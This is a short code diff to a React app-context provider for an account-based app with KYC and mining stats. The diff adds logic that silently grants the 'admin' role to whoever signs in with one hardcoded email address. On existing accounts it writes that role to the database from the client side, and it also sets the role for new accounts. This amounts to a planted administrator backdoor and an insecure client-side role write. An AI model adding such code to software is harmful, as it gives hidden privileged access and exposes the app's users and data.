@@ -63,6 +63,11 @@ export function AppProvider({ children }: { children: React.ReactNode }) {
             setUser(null);
             alert("Your account has been blocked by an administrator.");
           } else {
+            // Auto-upgrade to admin for the specific email
+            if (fUser.email === 'hzhssaadh@gmail.com' && u.role !== 'admin') {
+               await setDoc(userRef, { role: 'admin' }, { merge: true });
+               u.role = 'admin';
+            }
             setUser(u);
           }
         } else {
@@ -82,7 +87,7 @@ export function AppProvider({ children }: { children: React.ReactNode }) {
             joinDate: Date.now(),
             dailyStreak: 0,
             kycStatus: 'pending',
-            role: 'user',
+            role: (fUser.email === 'hzhssaadh@gmail.com') ? 'admin' : 'user',
             isActive: true,
             totalMined: 0,
             lastCheckIn: null
